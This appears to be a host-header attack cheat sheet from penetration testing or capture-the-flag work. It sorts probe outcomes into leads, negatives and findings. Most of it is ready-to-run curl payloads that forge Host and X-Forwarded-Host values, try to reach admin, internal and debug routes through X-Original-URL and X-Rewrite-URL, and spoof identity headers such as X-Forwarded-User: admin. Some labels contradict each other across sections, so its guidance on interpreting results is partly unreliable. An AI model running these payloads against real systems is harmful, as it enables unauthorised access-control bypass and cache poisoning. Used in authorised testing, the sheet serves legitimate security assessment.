# Negative results deep — every host-header negative, exhaustively

The negative map — a probe, a result, a meaning.

---

## 1. A reflected host — a lead, not a finding

```text
a reflected host is a lead, not a finding. The host reached the body's markup
but did not reach a decision-bearing sink — a `Location`, `Set-Cookie`, a
`<link>`/`<script src>` or a middleware rewrite.
```

```bash
curl -s -D - -H 'Host: canary.example' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -H 'Host: canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -D - -H 'Host: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'Host: canary.example' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'Host: canary.example' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
```

## 2. A reflected forwarded header — a lead, not a finding

```text
a reflected forwarded header is a lead, not a finding. The forwarded header
reached the body's markup but did not reach a decision-bearing sink — a
`Location`, `Set-Cookie`, a `<link>`/`<script src>` or a middleware rewrite.
```

```bash
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/reset" | grep -i 'location\|set-cookie'
curl -s -H 'X-Forwarded-Host: canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/login" | grep -i 'set-cookie'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/redirect" | grep -i 'location'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/callback" | grep -i 'location'
```

## 3. A 400 on an invalid host — a valid negative result

```text
a 400 on an invalid host is a valid negative result — the app rejected the
host. Do not endlessly vary the payload — record the negative and move on.
```

```bash
curl -s -D - -H 'Host: ' "$BASE/"   # an empty host — a 400 is a valid negative
curl -s -D - -H 'Host:  ' "$BASE/"   # a whitespace host — a 400 is a valid negative
curl -s -D - -H 'Host: evil.example@target.com' "$BASE/"   # an @-separator — a 400 is a valid negative
curl -s -D - -H 'Host: target.com@evil.example' "$BASE/"   # an @-separator — a 400 is a valid negative
curl -s -D - -H 'Host: evil.example#target.com' "$BASE/"   # a #-separator — a 400 is a valid negative
curl -s -D - -H 'Host: target.com#evil.example' "$BASE/"   # a #-separator — a 400 is a valid negative
curl -s -D - -H 'Host: evil.example?target.com' "$BASE/"   # a ?-separator — a 400 is a valid negative
curl -s -D - -H 'Host: target.com?evil.example' "$BASE/"   # a ?-separator — a 400 is a valid negative
```

## 4. A 403 on a rewrite header — a valid negative result

```text
a 403 on a rewrite header is a valid negative result — the app rejected the
rewrite. Do not endlessly vary the payload — record the negative and move on.
```

```bash
curl -i "$BASE/admin"                        # expect 403 — a valid negative
curl -i -H 'X-Original-URL: /admin' "$BASE/" # 403 — a valid negative
curl -i -H 'X-Rewrite-URL: /admin' "$BASE/" # 403 — a valid negative
curl -i -H 'X-Forwarded-Path: /admin' "$BASE/" # 403 — a valid negative
curl -i -H 'X-Forwarded-Prefix: /admin' "$BASE/" # 403 — a valid negative
curl -i -H 'X-Original-Path: /admin' "$BASE/" # 403 — a valid negative
curl -i -H 'X-Real-Path: /admin' "$BASE/" # 403 — a valid negative
curl -i -H 'X-Original-URL: /internal' "$BASE/" # 403 — a valid negative
curl -i -H 'X-Original-URL: /private' "$BASE/" # 403 — a valid negative
```

## 5. A 404 on a rewrite header — a valid negative result

```text
a 404 on a rewrite header is a valid negative result — the app rejected the
rewrite. Do not endlessly vary the payload — record the negative and move on.
```

```bash
curl -i "$BASE/admin"                        # expect 404 — a valid negative
curl -i -H 'X-Original-URL: /admin' "$BASE/" # 404 — a valid negative
curl -i -H 'X-Rewrite-URL: /admin' "$BASE/" # 404 — a valid negative
curl -i -H 'X-Forwarded-Path: /admin' "$BASE/" # 404 — a valid negative
curl -i -H 'X-Forwarded-Prefix: /admin' "$BASE/" # 404 — a valid negative
curl -i -H 'X-Original-Path: /admin' "$BASE/" # 404 — a valid negative
curl -i -H 'X-Real-Path: /admin' "$BASE/" # 404 — a valid negative
curl -i -H 'X-Original-URL: /internal' "$BASE/" # 404 — a valid negative
curl -i -H 'X-Original-URL: /private' "$BASE/" # 404 — a valid negative
```

## 6. A 200 on a rewrite header — a valid positive result

```text
a 200 on a rewrite header is a valid positive result — the app accepted the
rewrite and returned the admin body. A finding.
```

```bash
curl -i "$BASE/admin"                        # expect 403
curl -i -H 'X-Original-URL: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Rewrite-URL: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Forwarded-Path: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Forwarded-Prefix: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Original-Path: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Real-Path: /admin' "$BASE/" # 200 with the admin body = finding
curl -i -H 'X-Original-URL: /internal' "$BASE/" # 200 with the internal body = finding
curl -i -H 'X-Original-URL: /private' "$BASE/" # 200 with the private body = finding
curl -i -H 'X-Original-URL: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i -H 'X-Original-URL: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i -H 'X-Original-URL: /api/private' "$BASE/" # 200 with the api private body = finding
curl -i -H 'X-Original-URL: /api/user' "$BASE/" # 200 with the api user body = finding
curl -i -H 'X-Original-URL: /api/debug' "$BASE/" # 200 with the api debug body = finding
curl -i -H 'X-Original-URL: /api/preview' "$BASE/" # 200 with the api preview body = finding
curl -i -H 'X-Rewrite-URL: /internal' "$BASE/" # 200 with the internal body = finding
curl -i -H 'X-Rewrite-URL: /private' "$BASE/" # 200 with the private body = finding
curl -i -H 'X-Rewrite-URL: /api/admin' "$BASE/" # 200 with the api admin body = finding
curl -i -H 'X-Rewrite-URL: /api/internal' "$BASE/" # 200 with the api internal body = finding
curl -i -H 'X-Rewrite-URL: /api/private' "$BASE/" # 200 with the api private body = finding
curl -i -H 'X-Rewrite-URL: /api/user' "$BASE/" # 200 with the api user body = finding
curl -i -H 'X-Rewrite-URL: /api/debug' "$BASE/" # 200 with the api debug body = finding
curl -i -H 'X-Rewrite-URL: /api/preview' "$BASE/" # 200 with the api preview body = finding
```

## 7. A timeout — never a confirm

```text
a timeout is never a confirm — the response was not read. Do not claim a flag
from a timeout.
```

```bash
curl -s -D - -m 5 -H 'Host: canary.example' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -H 'Host: canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
```

## 8. A connection reset — never a confirm

```text
a connection reset is never a confirm — the response was not read. Do not
claim a flag from a connection reset.
```

```bash
curl -s -D - -H 'Host: canary.example' "$BASE/robots.txt" | grep -i 'location\|set-cookie'
curl -s -H 'Host: canary.example' "$BASE/page" | grep -o 'canary[^"< ]*'
```

## 9. A cache indicator — a lead, not a finding

```text
a cache indicator (`X-Cache`, `X-Served`, `Age`) is a lead, not a finding. The
cache indicator changed but the host did not reach a decision-bearing sink.
```

```bash
curl -s -D - -H 'Host: canary.example' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
curl -s -D - -H 'X-Forwarded-Host: canary.example' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
curl -s -D - -H 'X-Host: canary.example' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
curl -s -D - -H 'Forwarded: host=canary.example' "$BASE/page" | grep -i 'x-cache\|x-served\|age'
```

## 10. A duplicated Host — a differential, not a finding

```text
a duplicated Host is a differential, not a finding. The proxy reads the first;
the app reads the second — a parsing differential.
```

```bash
curl -s -D - -H 'Host: good.example' -H 'Host: evil.example' "$BASE/"
curl -s -D - -H 'Host: evil.example' -H 'Host: good.example' "$BASE/"
curl -s -D - -H 'Host: good.example' -H 'Host: target.com' "$BASE/"
curl -s -D - -H 'Host: target.com' -H 'Host: good.example' "$BASE/"
curl -s -D - -H 'Host: good.example' -H 'Host: internal' "$BASE/"
curl -s -D - -H 'Host: internal' -H 'Host: good.example' "$BASE/"
```

## 11. A malformed Host — a parsing edge, not a finding

```text
a malformed Host is a parsing edge, not a finding. The host reached the body's
markup but did not reach a decision-bearing sink.
```

```bash
curl -s -D - -H 'Host: evil.example:80' "$BASE/"   # a forged port — a parsing edge
curl -s -D - -H 'Host: evil.example:443' "$BASE/"   # a forged port — a parsing edge
curl -s -D - -H 'Host: evil.example:8080' "$BASE/"   # a forged port — a parsing edge
curl -s -D - -H 'Host: evil.example.' "$BASE/"   # a trailing dot — a parsing edge
curl -s -D - -H 'Host: evil.example..target.com' "$BASE/"   # a double-dot — a parsing edge
curl -s -D - -H 'Host: evil.example..internal' "$BASE/"   # a double-dot — a parsing edge
curl -s -D - -H 'Host: ' "$BASE/"   # an empty host — a parsing edge
curl -s -D - -H 'Host:  ' "$BASE/"   # a whitespace host — a parsing edge
curl -s -D - -H 'Host: evil.example@target.com' "$BASE/"   # an @-separator — a parsing edge
curl -s -D - -H 'Host: target.com@evil.example' "$BASE/"   # an @-separator — a parsing edge
curl -s -D - -H 'Host: evil.example#target.com' "$BASE/"   # a #-separator — a parsing edge
curl -s -D - -H 'Host: target.com#evil.example' "$BASE/"   # a #-separator — a parsing edge
curl -s -D - -H 'Host: evil.example?target.com' "$BASE/"   # a ?-separator — a parsing edge
curl -s -D - -H 'Host: target.com?evil.example' "$BASE/"   # a ?-separator — a parsing edge
curl -s -D - -H 'Host: evil.example/target.com' "$BASE/"   # a path separator — a parsing edge
curl -s -D - -H 'Host: target.com/evil.example' "$BASE/"   # a path separator — a parsing edge
curl -s -D - -H 'Host: evil.example\\target.com' "$BASE/"   # a backslash separator — a parsing edge
curl -s -D - -H 'Host: target.com\\evil.example' "$BASE/"   # a backslash separator — a parsing edge
```

## 12. An absolute-URI — a differential, not a finding

```text
an absolute-URI is a differential, not a finding. The proxy reads the Host
header; the app reads the absolute-URI — a request-line differential.
```

```bash
curl -s -D - "$BASE/" --request-target 'http://evil.example/'   # an absolute-URI
curl -s -D - "$BASE/" --request-target 'http://target.com/'   # an absolute-URI
curl -s -D - "$BASE/" --request-target 'http://internal/'   # an absolute-URI
curl -s -D - "$BASE/" --request-target 'http://localhost/'   # an absolute-URI
curl -s -D - "$BASE/" --request-target 'http://127.0.0.1/'   # an absolute-URI
```

## 13. A multi-header — a combined injection, not a finding

```text
a multi-header bypass is a combined injection, not a finding. The combined
injection reached a privileged route.
```

```bash
curl "$BASE/api/internal" -H 'Host: evil.example' -H 'X-Internal: true'   # a host + an internal
curl "$BASE/api/admin" -H 'Host: evil.example' -H 'X-Admin: true'   # a host + an admin
curl "$BASE/api/user" -H 'Host: evil.example' -H 'X-Forwarded-User: admin'   # a host + a user
curl "$BASE/api/debug" -H 'Host: evil.example' -H 'X-Debug: true'   # a host + a debug
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Proto: http'   # a host + a scheme
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Scheme: http'   # a host + a scheme
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Original-URL: /admin'   # a host + a path
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Path: /admin'   # a host + a path
curl "$BASE/api" -H 'X-Forwarded-Host: attacker.com' -H 'X-Forwarded-Prefix: /admin'   # a host + a prefix
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-Host: attacker.com'   # a host + a forwarded host
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-Proto: http'   # a host + a scheme
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-Scheme: http'   # a host + a scheme
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Original-URL: /admin'   # a host + a path
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-Path: /admin'   # a host + a path
curl "$BASE/api" -H 'Host: evil.example' -H 'X-Forwarded-Prefix: /admin'   # a host + a prefix
```

## 14. A multi-proxy — a chained normalization, not a finding

```text
a multi-proxy chain is a chained normalization, not a finding. The header
reached the origin differently.
```

```bash
curl "$BASE/page" -H 'X-Forwarded-Host: attacker.com'   # the edge strips it; the origin doesn't
curl "$BASE/page" -H 'X-Forwarded-Proto: http'   # a chained normalization
curl "$BASE/page" -H 'X-Forwarded-Scheme: http'   # a chained normalization
curl "$BASE/page" -H 'X-Forwarded-User: admin'   # a chained user differential
curl "$BASE/page" -H 'X-Forwarded-Email: admin@target.com'   # a chained email differential
curl "$BASE/page" -H 'X-Forwarded-Server: internal'   # a chained server differential
curl "$BASE/page" -H 'X-Forwarded-Port: 8080'   # a chained port differential
curl "$BASE/page" -H 'X-Forwarded-Path: /admin'   # a chained path differential
curl "$BASE/page" -H 'X-Forwarded-Prefix: /admin'   # a chained prefix differential
```
